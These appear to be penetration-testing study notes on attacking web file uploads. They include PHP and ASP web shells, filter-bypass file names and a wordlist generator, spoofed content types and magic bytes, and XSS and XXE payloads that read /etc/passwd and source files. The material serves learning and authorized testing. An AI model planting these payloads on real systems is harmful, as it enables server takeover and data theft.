# File Upload

Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information.
The most common and critical attack caused by arbitrary file uploads is gaining remote command execution over the back-end server by uploading a web shell or uploading a script that sends a reverse shell.

**Example of Web Shell**

PHP
````
$ <?php system($_REQUEST['cmd']); ?> > shell.php
````
For .NET web applications, we can pass the cmd parameter with request('cmd') to the eval() function:
````
<% eval request('cmd') %>
````

## Bypassing Filters

**Bypass Client-Side Validation**

- Disable in devtools
- Use burp repeater

### Filters

#### Blacklist Filter 

**Blacklisting Extensions**

As the web application seems to be testing the file extension, our first step is to fuzz the upload functionality with a list of potential extensions and see which of them return the previous error message. Any upload requests that do not return an error message, return a different message, or succeed in uploading the file, may indicate an allowed file extension.

- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP

#### Whitelist Filters

**Whitelisting Extensions**

Double Extension
````
shell.php.jpg
````

Character Injection

We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.
- %20
- %0a
- %00
- %0d0a
- /
- .\
- .
- …
- :

````
shell.php%00.jpg
shell.aspx:.jpg
````
````
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
````

#### Other filters

There are two common methods for validating the file content: Content-Type Header or File Content.

**Content-Type**

We need to find out what content types the application allows. Following the example of an app that only allows images, this means that it will only allow content types of the image/* style. This means that if we modify the content-type header of our file to a permitted one during upload, we can exploit this vulnerability.

````
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
````
Fuzzing to discover which is allowed.

**MIME-Type**

The second and more common type of file content validation is testing the uploaded file's MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure.
This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes. For example, if a file starts with (GIF87a or GIF89a), this indicates that it is a GIF image, while a file starting with plaintext is usually considered a Text file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

````
$ echo "this is a text file" > text.jpg 
$ file text.jpg 
text.jpg: ASCII text

$ echo "GIF8" > text.jpg 
$file text.jpg
text.jpg: GIF image data
````

````
filename="shell.php"
Content-Type: image/jpg

GIF8
<?php system('whoami'); ?>
````


**XSS**

We can execute an XSS attack through the metadata of an image.
````
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
````
SVG
````
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
````

**XXE**

````
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
````

Example SVG
````
filename svg:  filename="shell.phar.svg"
Content-type: image/svg

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
<?php system($_GET['cmd']); ?>
````

